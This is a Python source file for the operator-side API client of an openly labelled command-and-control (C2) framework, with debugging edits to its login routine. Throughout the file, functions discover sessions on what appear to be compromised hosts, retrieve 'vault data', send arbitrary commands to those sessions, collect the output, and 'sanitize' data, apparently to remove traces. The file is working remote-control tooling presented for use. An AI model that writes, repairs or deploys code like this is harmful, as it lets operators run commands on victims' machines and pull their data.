# C2_Client/api_client.py (Full file with enhanced debugging)
import requests
import json
from config import RELAY_URL_FORMAT

class ApiClient:
    def __init__(self, main_window):
        self.main_window = main_window
        self.session = requests.Session()
        self.base_url = None
        self.line_number = None

    def set_line(self, line_number):
        self.line_number = line_number
        self.base_url = RELAY_URL_FORMAT.format(line_number)
        print(f"[API Client] Communication line set to: {self.base_url}")

    def _request(self, method, endpoint, **kwargs):
        # --- NEW DEBUGGING LOGIC ---
        # For auth actions, ONLY try line 1 for this test
        if endpoint in ['/auth/login', '/auth/register', '/auth/delete']:
            
            # --- START OF MODIFIED CODE ---
            # We are hardcoding this to ONLY use line 1 for our test.
            target_line_number = 1
            url = RELAY_URL_FORMAT.format(target_line_number) + endpoint
            print(f"[API DEBUG] TARGETING SINGLE LINE: Attempting {method} request to {url}")
            
            try:
                response = self.session.request(method, url, timeout=10, **kwargs)
                print(f"[API DEBUG] Received response from {url}: {response.status_code}")
                
                # Check if the response has content before trying to parse JSON
                if not response.text:
                    print(f"[API FATAL] Server returned an empty response.")
                    return {"success": False, "error": f"Server error on line {target_line_number}: Empty response."}

                return response.json()

            except requests.exceptions.RequestException as e:
                print(f"[API DEBUG] Connection error on line {target_line_number}: {e}")
                self.main_window.statusBar().showMessage(f"API Error: Could not connect to C2 line {target_line_number}.", 5000)
                return None
            # --- END OF MODIFIED CODE ---

        # For regular C2 traffic to a specific line
        if not self.base_url:
            self.main_window.statusBar().showMessage("API Error: Not logged in.", 5000)
            return None
            
        try:
            url = f"{self.base_url}{endpoint}"
            response = self.session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            error_message = f"API Error: {e}"
            if e.response is not None:
                try:
                    error_details = e.response.json().get("error", "No details provided.")
                    error_message += f" - {error_details}"
                except: pass
            self.main_window.statusBar().showMessage(error_message, 5000)
            return None

    def register(self, username, password):
        return self._request('POST', '/auth/register', json={'username': username, 'password': password})

    def login(self, username, password):
        return self._request('POST', '/auth/login', json={'username': username, 'password': password})

    def delete_account(self, username):
        return self._request('POST', '/auth/delete', json={'username': username})

    def discover_sessions(self, username):
        return self._request('POST', '/c2/discover', json={'username': username})

    def get_all_vault_data(self, username):
        return self._request('POST', '/c2/get_all_vault_data', json={'username': username})

    def get_responses(self, username, session_id):
        return self._request('POST', '/c2/get_responses', json={'username': username, 'session_id': session_id})

    def send_task(self, username, session_id, command):
        return self._request('POST', '/c2/task', json={'username': username, 'session_id': session_id, 'command': command})

    def sanitize_data(self, username):
        return self._request('POST', '/c2/sanitize', json={'username': username})